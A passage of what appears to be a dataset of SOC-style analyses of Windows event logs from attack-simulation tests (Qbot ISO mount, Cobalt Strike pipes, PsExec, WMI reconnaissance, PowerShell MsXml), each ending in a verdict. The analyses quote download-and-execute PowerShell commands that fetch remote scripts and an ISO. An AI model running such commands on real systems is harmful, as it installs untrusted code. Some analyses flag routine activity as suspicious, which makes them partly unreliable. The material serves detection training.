### Guidance on How to Proceed

1. **Immediate Isolation**: Isolate the affected system from the network to prevent further potential spread or data exfiltration.
2. **Conduct a Forensic Analysis**: Investigate the full chain of events. Check for any additional modifications made on the system.
3. **Mitigation Steps**:
   - Remove any detected malicious scripts/files.
   - Consider resetting passwords associated with potentially compromised accounts.
4. **Prevention**:
   - Implement application whitelisting to prevent unauthorized PowerShell commands.
   - Educate users about the risks of executing internet-obtained scripts.
   - Improve monitoring to detect and alert on similar activities moving forward.

This assessment indicates a need for a thorough investigation and appropriate incident response actions to mitigate this potential security threat."
Malicious Execution from Mounted ISO Image,"Upon analyzing the provided Windows event logs, there are several notable observations:

1. **PowerShell Activity**:  
   - The PowerShell logs indicate the execution of a script that downloads an ISO image from a URL (https://raw.githubusercontent.com/file/file-file/master/files/data.003/src/qbot-test.iso) and mounts it.
   - The script then runs a file named `calc.exe.lnk` located within the ISO. Given the context and naming, this might not be a legitimate calculator application and could potentially be malicious. 
   - The use of `Invoke-Expression (IEX)` with `iwr` (Invoke-WebRequest) to execute code fetched from a URL is a common technique in executing malicious scripts.

2. **Sysmon Logs**:  
   - There’s heavy activity involving processes like `whoami.exe`, `conhost.exe`, and suspicious command-line executions, such as launching `cmd.exe` with parameters to execute `calc.exe`.
   - The process `calc.exe` is executed from an unexpected path (E:\ in this context), which corresponds with the mounted path described in the PowerShell log. This indicates that the suspicious PowerShell activity successfully resulted in the execution of potentially harmful code.

3. **Application and System Logs**:  
   - Regular service starts and stops for standard operations like Edge Update and Windows Defender are noted, with no extreme anomalies in these logs themselves.
   - Windows Defender logs indicate it's in the 'ON' state, suggesting it's potentially active, but this has not prevented the execution of the PowerShell script, which could imply the script might evade detection or may not contain identified signatures of known malicious threats.

4. **Security Logs**:  
   - Various logon activities mainly for the SYSTEM account, without any unauthorized or failed attempts noted during this period.

5. **Indicators of Malicious Activity**:  
   - The combination of the use of PowerShell to download and execute an external file, the use of symbolic link (`calc.exe.lnk`) to potentially hide the true nature of the executable, and the execution path irregularity are strong indicators of a malicious attempt.
   - The specific reference to `qbot` in the URL is especially concerning as Qbot (also known as Qakbot) is a well-known banking trojan, which indicates potential data theft or system compromise.

### Conclusion:
- Based on the above observations, there is clear evidence of potentially malicious activity. The execution of code from mounted external media via PowerShell, especially with the signatures resembling known malicious methods, suggests a high likelihood of system compromise.

### Resolution:
- **MALICIOUS**: The logs contain activities strongly indicative of a Qbot malware infection attempt.

### Recommendations:
1. **Immediate Isolation**: Disconnect the affected machine from the network to prevent further spread or data exfiltration.
2. **In-depth Forensics**: Conduct full disk and memory forensics to confirm the presence of malware and understand its impact.
3. **Erase and Restore**: Backup necessary data and perform a complete OS reinstall to remove any hidden backdoors or malware remnants.
4. **Review and Strengthen Security Controls**: Review firewall rules, proxy settings, and endpoint security configurations to prevent similar attempts in the future.
5. **Security Awareness**: Conduct awareness training for users about the risks of executing unknown scripts and files. 

Engage with your incident response team to coordinate these response actions appropriately."
Cobalt Strike Artifact Kit pipe,"Upon reviewing the event logs, certain activities and patterns stand out, indicating anomalies and potentially suspicious behavior. Below is the breakdown of the observations:

### Notable Observations:
1. **Named Pipes and External Files**:
   - Usage of a named pipe executor, `namedpipes_executor.exe`, running from what appears to be a temporary directory: `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\Externalfiles\\build\\namedpipes_executor.exe`.
   - This process spawning client and server executables indicates unusual activity suggesting possible interprocess communication or a backdoor attempt.

2. **Multiple Instances of System Utilities**:
   - Freqeunt executions of `wevtutil.exe`, `whoami.exe`, `hostname.exe`, and `cmd.exe` by `SERVER002\\admin_test`.
   - Commands running relatively close in time using administrative or NT AUTHORITY\SYSTEM context without clear benign motives.

3. **PowerShell Activity**:
   - A PowerShell instance is noted, which is often used in lateral movement and executing scripts or commands on a system. The lack of corresponding detailed logs of PowerShell commands makes it more concerning if not accounted for.

4. **Remote Activity from Temp Locations**:
   - Programs appearing to run from temporary directories, especially those related to Microsoft Edge Updates, though generally benign, there could be a misuse potential if masquerading malicious files with legitimate names.

5. **Account Enumeration**:
   - Security log entries (EventID 4798) showing account enumeration, especially for multiple accounts — a behavior often associated with reconnaissance.

6. **Multiple Elevated Tokens**:
   - Multiple entries of EventID 4672, indicating special privileges being assigned to SYSTEM users, suggest potential misuse of administrative privileges.

### Assessment:
The behavioral patterns collectively indicate a possible security incident or suspicious activity that requires further investigation:
- The use of command-line utilities in a batch, especially `cmd.exe` calling executables from a Temp folder.
- Account enumeration, although normal for auditing or admin checks, the combination with other anomalies raises a flag.
- Processes commonly associated with troubleshooting, informational queries, or potential backdoors being executed closely together without an apparent valid context.

### Conclusion:
Based on the evaluation of these logs, the observed activities fall under the **SUSPICIOUS** category. While there is insufficient evidence to definitively confirm malicious intents, the behavioral patterns indicate potential security risks or an ongoing investigation worth exploring further. It is crucial to:

- Conduct deeper analysis or monitoring of the mentioned suspicious executables via endpoint detection and response solutions.
- Verify if any unusual scripts or commands were executed in the PowerShell environment.
- Check if the files and directories in these temporary locations are legitimate and expected.
- Review user activity, especially of `SERVER002\\admin_test`, to ensure no anomalous usage patterns occur.
- Consider leveraging additional logging for comprehensive visibility, such as the full PowerShell transcript log.

**Resolution**: **SUSPICIOUS** - Logs indicate activities that do not look entirely legitimate and warrant further investigation to rule out potential compromise."
Pipe Creation - PsExec Tool Execution From Suspicious Locations,"After carefully examining the provided event logs, I have identified specific activities that raise concern regarding potential malicious activity. Here is a detailed analysis:

1. **PsExec Execution**:
   - In the Windows PowerShell logs, the command ""powershell.exe &amp; {cd C:\\Users\\Public\\Temp\\ .\\PsExec.exe -i -s cmd -accepteula}"" indicates PsExec is being used. PsExec is a legitimate Sysinternals tool but is often leveraged by attackers for lateral movement and executing commands with elevated privileges without triggering UAC prompts. The use of PsExec (`PSEXESVC`) by an administrative account (`admin_test`) on `SERVER002` is documented as a service installed ""on-demand"" in the system logs.

2. **Privilege Escalation Attempts**:
   - The security logs show several instances of the admin_test account being granted privileges such as `SeDebugPrivilege`, `SeBackupPrivilege`, and others typically associated with elevated privileges. While these may not inherently be malicious, when seen alongside the PsExec activity, it raises a flag for potential privilege escalation attempts.

3. **Suspicious Process Execution**:
   - The Sysmon logs document suspicious process creation involving the PsExec service (`PSEXESVC.exe`) and subsequent use of cmd.exe. Additionally, process execution such as `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe` with commands that could target system configurations or inspect system files suggests potential recon or configuration changes.

4. **Network Activity**:
   - Multiple log entries reflect network-related activities, including connections from a workstation (DESKTOP-3HL5B2P) using NTLM. The source address (`fe80::e3b5:5371:12a8:9c77`) implies communication that coincides with potentially suspicious actions.

5. **Repeated Account Privilege Enumeration**:
   - Event ID 4798 in the security logs indicates repeated queries of user and group details using `CompatTelRunner.exe`, a telemetry component. While this could be benign, its occurrence during potential suspicious activity merits close scrutiny.

**Assessment and Recommendations**:
- **Resolution: SUSPICIOUS**
  - The activities captured suggest potentially malicious intentions, leveraging administrative utilities in ways typical of attackers seeking privilege escalation or lateral movement.
- **Next Steps**:
  - Conduct an immediate Endpoint Detection and Response (EDR) or antivirus scan on `SERVER002` to identify any persistent threats.
  - Review user activity logs, especially for the `admin_test` account, to determine if these actions align with usual tasks or could potentially indicate a compromised account.
  - Review network traffic logs for uncharacteristic connections or data exfiltration attempts correlating with the outlined timestamps.
  - Implement stricter monitoring of processes initiated by `PsExec` and improve alerting on actions involving elevated privileges.
  - Ensure patching and updates are current to mitigate exploitation of known vulnerabilities commonly used alongside this kind of activity.

Engage with the system owner or affected users for any insights into unusual or unexpected system behavior during or prior to the timestamps in the logs."
Cobalt Strike post-exploitation pipe (4.2 and later),"Based on the provided log entries, an analysis is conducted to identify any suspicious or malicious activity. Here is a breakdown of the findings:

### Initial Observations

1. **Privilege Assignment (EventID 4672)**
   - The user ""admin_test"" obtained special privileges such as SeDebugPrivilege. This could potentially be used for malicious purposes, especially if this user account or SID ('S-1-5-21-3962163828-2803415714-1403596700-1006') is not typically active or has not been involved in legitimate administrative tasks.

2. **Logon Events (EventID 4624)**
   - Logon event indicating an NTLM logon (LogonType 3) from a machine named DESKTOP-3HL5B2P to Server002 using the ""admin_test"" account. This could be legitimate but needs context regarding who should have access and under what circumstances. 

3. **Suspicious Process Activity (Sysmon Events)**
   - The execution of `wevtutil.exe`, `cmd.exe`, and `conhost.exe` is recorded multiple times by the user ""admin_test,"" predominantly in the temporary directories (`AppData\Local\Temp`). This pattern of behavior is often associated with suspicious activity. `wevtutil.exe` can be used to query or clear event logs, which might indicate an attempt to obfuscate activity.

4. **Named Pipe Executables**
   - The presence and execution of potentially uncommon executables like `namedpipes_executor.exe`, `namedpipes_server.exe`, and `namedpipes_client.exe` found in the Temp directory suggests the possibility of inter-process communication being established for data exfiltration or command/control purposes. These executables weren't standard Windows operating system files, which adds to the suspicion.

5. **System Processes (EvtID 1 and 5 in Sysmon)**
   - Processes such as `HOSTNAME.EXE`, `whoami.exe`, `sppsvc.exe`, and `WmiPrvSE.exe` are observed which might be benign if used correctly or might be used for reconnaissance if used in a specific sequence.

6. **Software Updates**
   - Some logs record update processes related to the Microsoft Edge browser, which appear typical but should be determined if they align with known update schedules.

### Assessment

The logs suggest potentially suspicious activity around the user account ""admin_test"". Several suspicious processes are running from unconventional directories, especially involving potential malware executables (e.g., named pipes related executables in Temp). Privilege escalation activities and suspicious network-related logons also indicate possible malicious behavior.

### Resolution

Resolution: **MALICIOUS**

Given the combination of factors:
- The assignment of sensitive privileges to ""admin_test"".
- The execution patterns of system utilities (`wevtutil.exe`, `cmd.exe`, etc.) potentially used for evasion.
- The presence of suspicious executables.
- The unusual logon event and context with NTLM indicating possible lateral movement.

It is crucial to immediately investigate the ""admin_test"" account activities further, isolate the affected systems if possible, review similar logs on other servers for parallel activities, and conduct a thorough incident response to assess potential breach impact."
WMI Reconnaissance List Remote Services,"Upon reviewing the provided logs, few elements stand out as potentially suspicious:

1. **Time Manipulation:** In the Security and System logs, there's evidence of the time on the server being backdated. This is seen in EventID 4616, where the `PreviousTime` is later than the `NewTime`. Such actions could be an attempt to cover tracks by manipulating logs or time-based evidence.

2. **Privileged Logon and Execution:** The logs show multiple instances of an account named `admin_test` performing actions with elevated privileges, as indicated by EventID 4672, which lists a series of high-level privileges including `SeDebugPrivilege`, `SeLoadDriverPrivilege`, and others that allow for potential system manipulation. This could signify an administrative account being exploited for malicious purposes.

3. **Execution of Administrative Commands:** The Sysmon log records indicate use of tools like `wevtutil.exe` and `WMIC` (Event ID 1 and Event ID 5) by the `admin_test` user, which can be used to manage events and execute system-level commands respectively. While not inherently malicious, the context combined with time manipulation and privileged operations raises suspicion.

4. **Unusual Process Spawning:** There are several instances of processes like `conhost.exe` and `cmd.exe` spawning in rapid succession in the Sysmon logs without clear context, which can be indicative of script or batch file execution commonly associated with lateral movement or malicious scripts.

5. **Shell Commands with Spooler Metadata:** The command using `wmic` targets the Spooler service, which has been historically exploited for vulnerabilities. The specific command checks the service status and could potentially be used in reconnaissance or exploitation activities.

6. **Common Legitimate Software Running Pretty Close:** Processes such as `MicrosoftEdgeUpdate.exe` and `HOSTNAME.EXE` appear in the logs, which by themselves could be benign but their timing close to other events could mean they were used for evasion or blending malicious activity into legitimate processes.

### Assessment and Recommendations:

Based on the detailed analysis, the behavior observed in these logs leads to a conclusion of:

- **Resolution: SUSPICIOUS**

The time manipulation, slew of privileged commands and accesses by the `admin_test` user, and execution of potentially administrative tools should be investigated further to rule out compromise or misuse of credentials. This could involve:

1. **Conducting Root Cause Analysis:** Determine why the time was changed. Check for any external access or misconfiguration on time settings or synchronization.

2. **Verify User Activity:** Cross-reference other logs or systems to ensure activities under the `admin_test` user align with legitimate administrative duties.

3. **Forensic Analysis:** Examine system integrity, checking for unauthorized changes or entries, particularly around the Event Logs and their timestamps.

4. **Credential Assessment:** Investigate the legitimacy of the `admin_test` account and consider monitoring or revalidating credential integrity.

5. **System Hardening:** Evaluate the need to restrict or closely monitor activities that involve system process manipulation through tools like `wevtutil` or `wmic`.

6. **Continuous Monitoring:** Enhance system and security monitoring to flag suspicious combinations of events, especially those involving sensitive system functions or manipulation attempts.

This approach will ensure any malicious activity is identified and mitigated effectively, and that the root cause is adequately addressed for future prevention."
WMI Reconnaissance Users,"Based on the provided log entries, let's perform a detailed analysis:

### Key Log Observations:
1. **Time Change Events (Events 4616, 1, and 24)**:
   - Several logs suggest that the system time was reset or altered (Event IDs 4616 and Kernel-General Event IDs 1 and 24). Time changes can be a cause for concern if unauthorized, as they might indicate an attempt to manipulate timestamps for bypassing security logs.

2. **Privilege Use (Events 4672 and 4624)**:
   - User `admin_test` was granted special privileges (Event ID 4672). This includes `SeDebugPrivilege`, among others, which can be sensitive if misused.
   - Multiple logon events (Event ID 4624) show `admin_test` accessing the system using NTLM authentication, with an IPv6 address indicating potential remote access.

3. **Process Execution and Timing (Sysmon Events)**:
   - Processes like `wevtutil.exe`, `conhost.exe`, and `whoami.exe` were executed in rapid succession by `admin_test`. This might suggest script-based automation.
   - `cmd.exe` running with a command-line accessing `wmic useraccount get` (Event ID 1 in Sysmon) is unusual unless explicitly executed for administrative purposes, indicating a possible enumeration or audit.

4. **Enumeration Behavior (Event ID 4798)**:
   - User `admin_test` is seen querying information about several user accounts (`Administrator`, `Guest`, etc.). This activity could point to an enumeration attempt.

5. **Parent Process Anomalies**:
   - The `cmd.exe` process has an absent parent process (`ParentProcessGuid` and `ParentProcessId` are empty), which is atypical and could suggest process injection or direct process creation by a possibly malicious actor.

### Assessment:
- The overall sequence of events includes unauthorized time changes, escalation to high privileges, systemic querying of user accounts, and unexplained process execution patterns. 
- These signs may point towards automation, enumeration, potential privilege escalation, and attempts to cover tracks (via time changes).

### Conclusion:
Given these indicators of unusual and potentially unauthorized activities, the logs display behavior consistent with potential malicious activity.

### Resolution:
- **SUSPICIOUS**: While there is evidence suggesting potentially malicious activities, definitive proof of compromise is not established based on these logs alone. Further investigation is required to determine intent, context, and potential external factors influencing these events.

### Guidance on How to Proceed:
1. Conduct a deeper forensic analysis, especially focusing on any network connections or known indicators of compromise related to the `admin_test` user account.
2. Verify with IT or Security Ops if these were legitimate administrative tasks and examine any associated supporting logs or credentials used for access.
3. Investigate any external systems or devices corresponding to the IP addresses logged to verify whether they are known or authorized.
4. Review changes to system time in related logs for authorization and context, and ensure proper time synchronization across critical systems."
Command Prompt read contents from CMD file and execute,"**Detailed Analysis:**

The logs capture a series of events on a Windows host named ""Server002"". The events span from normal system activities to processes that might raise suspicion due to their context or behavior. Let us delve into these observations:

1. **PowerShell Events:**
   - A PowerShell process executed under the user ""SERVER002\\admin_test"" is noted. This could be benign if expected, but needs verification if such usage deviates from the norm for this user or system administrator activities.

2. **Unknown Process Execution:**
   - An event recorded an ""unknown process"" launched by the user ""SERVER002\\admin_test"", which is atypical. It indicates potential execution of a process that was not properly logged or is unfamiliar. This suggests an anomaly that needs further inspection.

3. **Multiple Instances of Command Line Execution:**
   - Several processes initiated by ""cmd.exe"" appear within a rapid timeframe, executing nested commands and redirections (notably involving temp directories). This pattern could suggest script-based automation, but given the lack of clarity around the intended activities or owners, it stands as suspicious, especially involving preparations or execution of hidden activities often associated with malicious intent.

4. **Event Logs and Process Access Tools:**
   - Multiple instances of “wevtutil.exe” (Windows Event Utility) indicate potential interaction with event logs. This activity, particularly in conjunction with manual command lines from administrators, can be part of regular auditing or could suggest potential log clearing by an adversary.

5. **Access to System Utilities like `hostname.exe` and `whoami.exe`:**
   - These utilities were executed, alongside subprocesses involving “conhost.exe,” which typically manages command prompt windows. These invocations warrant investigation into their purpose post-command prompt interactions - it could be legitimate or could indicate reconnaissance by a threat actor.

6. **Service Stop Logs:**
   - The ""edgeupdate"" service was repeatedly stopped. Such events require clarification, particularly if this service stopping is unscheduled or outside of software update timeframes. This might hint at maneuvering for security bypasses or as part of a tactics sequence.

7. **MS Edge Update Executions:**
   - Various Microsoft Edge Update activities were recorded, involving multiple administrative and SYSTEM users. A regular update could explain these; however, it is crucial to check if these coincide with expected patch cycles.

8. **Multiple Similar Hashes:**
   - The repetition of identical hashes for several command processes may suggest that these actions derive from a consistent script or module, which might indicate automation or malware presence.

**Assessment and Guidance:**

Given the outlined observations, the logs reflect a mix of benign system behavior and suspicious activities, notably:

- The presence of an ""unknown process"" and rapid, repetitive command executions require deeper inquiry.
- Multiple uses of system utilities and edge updates warrant reviewing against recent operational changes.
- The service stops of ""edgeupdate"" during odd times, alongside these processes, raise flags around potentially malicious activity aiming to manipulate typical update pathways or shield further actions from system monitoring.

**Resolution:**

**SUSPICIOUS** - The logs reveal activity deviating from expected patterns, although no definitive, malicious actions are conclusively identified. A more detailed investigation should focus on: system access permissions, user action intent, verification of cron job schedules, initiation sources of utility usage, and examination of process outcomes. Monitoring for potential persistence mechanisms or data exfiltration follows as a priority to affirm that the system remains secure."
Powershell MsXml COM object - with prompt,"**Detailed Analysis:**

Upon reviewing the logs, here's a breakdown of activity per log type:

1. **Security Logs:**
   - The EventID 4616 indicates a system time change. This could be legitimate if done by system processes or administrators for maintenance purposes, but multiple rapid time changes might also signal an attempt to manipulate logs. The keywords and other details do not provide explicit signs of malicious activity in this context when analyzed alone.

2. **System Logs:**
   - The system log reflects kernel-related operations and time changes. No unusual tasks or privilege escalations are explicitly visible here, beyond confirming the time adjustments from the security logs.

3. **Windows PowerShell Logs:**
   - These logs reveal PowerShell activity with a command indicating suspicious behavior:
     - Command execution with `-exec bypass`, `-noprofile`, and downloading/executing a script from a URL: `https://raw.githubusercontent.com/file/file-file/master/files/data.001/src/test.ps1`. This behavior is highly indicative of a PowerShell script being executed in a manner commonly used for avoiding detection and executing potentially harmful scripts without leaving traces.
   
4. **Sysmon Logs:**
   - The logs reveal the execution of multiple processes, with significant activity around the execution of `cmd.exe` with a PowerShell command that matches the suspicious script execution noted above. There is a pattern of processes involving `cmd.exe`, `powershell.exe`, and connections to remote URLs. This aligns with potentially harmful activity where scripts are downloaded and executed from potentially illegitimate sources.

5. **Application Logs:**
   - The logs here do not reveal any additional suspicious activity that wasn't already noted in other logs.

**Assessment:**

- **Indicators of Malicious Activity:**
  - The use of PowerShell with `-exec bypass` to download and execute a script from the web is a strong indicator of an attempted exploit or unauthorized script being run on the system.
  - The consistent execution of processes such as `cmd.exe` and `PowerShell.exe` executing remote scripts further corroborates this suspicion.

**Conclusion:**

Given the evidence of potentially malicious script execution via PowerShell commands and the correlation of events indicating unauthorized activity, especially the use of remote URLs and bypass execution policies, the logs should be classified as:

**MALICIOUS**

**Guidance on How to Proceed:**

1. **Immediate Isolation:** The affected host, `Server002`, should be isolated from the network immediately to prevent further compromise or lateral movement.
   
2. **Investigation and Remediation:**
   - Identify and terminate any suspicious processes currently running on the host.
   - Inspect and clear any existing malicious scripts or payloads from the system.
   - Conduct a forensic analysis to determine the origin and extent of the compromise.
   - Review and strengthen PowerShell execution policies and monitoring on the network.

3. **Future Prevention:**
   - Implement stricter controls on executable permissions, especially around PowerShell and command prompt usage.
   - Enhance security monitoring and logging for early detection of similar threats.
   - Conduct security awareness training to inform users of the risks related to executing scripts from unknown sources."
